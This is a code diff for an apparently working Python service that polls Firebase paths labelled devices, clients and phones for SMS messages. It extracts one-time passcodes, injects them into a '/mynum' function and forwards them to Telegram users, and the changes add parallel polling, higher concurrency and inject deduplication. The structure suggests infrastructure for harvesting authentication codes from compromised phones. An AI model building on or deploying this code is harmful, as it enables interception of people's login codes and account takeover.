@@ -32,7 +32,8 @@ def _otp_poll_timeout() -> float:
 
 MONITORING_START_SNAPSHOT_SEC = 4.0
 MAX_POLL_PATHS_FALLBACK = 8
-POLL_PROFILE_CONCURRENCY = 12
+def _poll_profile_concurrency() -> int:
+    return max(16, min(48, get_poll_workers()))
 HOT_POLL_MAX_PATHS = 4
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
@@ -102,9 +103,10 @@ TIME_FIELDS = (
     "createdDate",
 )
 RECENT_MESSAGES_LIMIT = 25
-MAX_OTP_DELIVER_PER_POLL = 12
+MAX_OTP_DELIVER_PER_POLL = 15
 _MESSAGES_DEVICE_PATH_RE = re.compile(r"^messages/[^/]+$")
 SEEN_META_KEY = "firebase_sms_seen"
+INJECT_DONE_META_KEY = "firebase_sms_inject_done"
 BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
@@ -170,6 +172,25 @@ def get_seen_sms_keys(device: Device) -> set[str]:
     return set()
 
 
+def get_inject_done_keys(device: Device) -> set[str]:
+    meta = _meta_dict(device)
+    done = meta.get(INJECT_DONE_META_KEY) or []
+    if isinstance(done, list):
+        return {str(item) for item in done}
+    return set()
+
+
+def mark_inject_done_keys(device: Device, keys: set[str]) -> None:
+    if not keys:
+        return
+    meta = _meta_dict(device)
+    done = list(get_inject_done_keys(device) | keys)
+    if len(done) > MAX_SEEN_KEYS:
+        done = done[-MAX_SEEN_KEYS:]
+    meta[INJECT_DONE_META_KEY] = done
+    _save_meta(device, meta)
+
+
 def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
     if not keys:
         return
@@ -220,6 +241,7 @@ def clear_sms_baseline(device: Device) -> None:
     meta.pop(BASELINE_AT_META_KEY, None)
     meta.pop(SEEN_META_KEY, None)
     meta.pop(MESSAGES_HIGH_WATER_META, None)
+    meta.pop(INJECT_DONE_META_KEY, None)
     _save_meta(device, meta)
 
 
@@ -1143,6 +1165,12 @@ async def _ensure_messages_high_water(
         shallow = await _fetch_messages_shallow_keys(root, device_id, fetch_timeout)
         if shallow:
             mark_sms_keys_seen(device, shallow)
+            for key in shallow:
+                leaf = key.rsplit("/", 1)[-1]
+                try:
+                    high_water = max(high_water, int(leaf))
+                except ValueError:
+                    continue
     except Exception:
         shallow = set()
 
@@ -1176,17 +1204,17 @@ async def _poll_messages_otp_only(
 
     root = firebase_root_url(firebase_url)
     fetch_timeout = _otp_poll_timeout()
-    records: list[dict[str, Any]] = []
-    for path in _build_hot_poll_paths(device):
-        try:
-            chunk = await asyncio.wait_for(
-                _fetch_path_records(root, path, fetch_timeout),
-                timeout=fetch_timeout + 0.35,
-            )
-            if chunk:
-                records.extend(chunk)
-        except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
-            logger.debug("OTP poll path miss %s device=%s: %s", path, device_id, exc)
+    paths = _build_hot_poll_paths(device)
+    try:
+        records, hit_paths = await asyncio.wait_for(
+            _fetch_paths_parallel(root, paths, timeout=fetch_timeout),
+            timeout=fetch_timeout + 0.5,
+        )
+        if hit_paths:
+            set_cached_sms_paths(device, hit_paths)
+    except (asyncio.TimeoutError, Exception) as exc:
+        logger.warning("OTP poll paths failed device=%s: %s", device_id, exc)
+        records = []
     records = _dedupe_records(records)
     if not records:
         logger.warning("OTP poll empty device=%s (network or wrong path)", device_id)
@@ -1232,21 +1260,28 @@ async def _poll_messages_otp_only(
         push_id = _message_push_id(record)
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
+        dedup = _record_dedup_key(record)
 
-        inject_ok = False
-        dm_ok = False
-        try:
-            await forward_incoming_to_mynum(db, profile, device, sender, body)
-            inject_ok = True
-        except Exception as exc:
-            logger.warning(
-                "OTP inject to /mynum failed device=%s sender=%s: %s",
-                device_id,
-                sender,
-                exc,
-            )
+        async def _run_inject() -> bool:
+            if dedup in get_inject_done_keys(device):
+                return True
+            try:
+                await forward_incoming_to_mynum(db, profile, device, sender, body)
+                mark_inject_done_keys(device, {dedup})
+                return True
+            except Exception as exc:
+                logger.warning(
+                    "OTP inject to /mynum failed device=%s sender=%s: %s",
+                    device_id,
+                    sender,
+                    exc,
+                )
+                return False
 
-        dm_ok = await send_otp_received_dm(profile.telegram_user_id, sender, body)
+        inject_ok, dm_ok = await asyncio.gather(
+            _run_inject(),
+            send_otp_received_dm(profile.telegram_user_id, sender, body),
+        )
         if not dm_ok:
             logger.error(
                 "OTP bot DM failed user=%s sender=%s id=%s (inject_ok=%s)",
@@ -1255,8 +1290,7 @@ async def _poll_messages_otp_only(
                 push_id,
                 inject_ok,
             )
-            if not inject_ok:
-                continue
+            continue
 
         save_sms(
             db,
@@ -1265,7 +1299,8 @@ async def _poll_messages_otp_only(
             device_name=device.name,
             received_at=record.get("received_at"),
         )
-        mark_sms_keys_seen(device, {_record_dedup_key(record)})
+        mark_sms_keys_seen(device, {dedup})
+        mark_inject_done_keys(device, {dedup})
         if push_id is not None:
             max_push_id = max(max_push_id, int(push_id))
         delivered += 1
@@ -1319,7 +1354,7 @@ async def poll_monitoring_profiles_once() -> int:
     if not profile_ids:
         return 0
 
-    semaphore = asyncio.Semaphore(POLL_PROFILE_CONCURRENCY)
+    semaphore = asyncio.Semaphore(_poll_profile_concurrency())
 
     async def run_one(profile_id: int) -> int:
         async with semaphore:
